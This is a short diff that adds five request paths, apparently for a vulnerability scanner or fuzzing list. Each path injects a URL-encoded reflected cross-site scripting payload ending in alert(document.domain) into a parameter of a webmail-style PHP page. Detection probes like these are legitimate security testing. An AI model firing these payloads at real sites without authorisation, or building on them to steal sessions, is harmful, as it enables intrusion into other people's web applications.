@@ -1,0 +1,5 @@
+/src/addressbook.php?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/src/options.php?optpage=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/src/search.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&what=x&where=BODY&submit=Search
+/src/search.php?mailbox=INBOX&what=x&where=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&submit=Search
+/src/help.php?chapter=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
